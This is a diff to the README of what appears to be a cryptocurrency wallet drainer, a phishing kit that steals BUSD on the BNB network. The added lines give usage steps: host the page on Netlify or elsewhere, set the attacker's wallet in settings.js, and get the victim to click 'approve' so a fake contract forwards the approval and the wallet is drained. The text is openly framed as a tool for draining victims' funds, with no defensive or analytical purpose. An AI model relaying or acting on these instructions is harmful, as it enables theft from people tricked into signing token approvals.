@@ -2,6 +2,12 @@ This script will let you drain BUSD from the targets address
 
 go to https://www.netlify.com/ to host or host it on a regular site
 
+Steps
+1.first connect to bnb network
+2.Click approve
+3.Smart contract approves you to drain wallet
+4.Drain wallet
+
 To use all you have to do is put your wallet address in the settings.js file.
 
 After the victim clicks approve it fowards the transaction to the fake contract that then fowards it to the wallet in the settings.js file this is to make sure the attacker
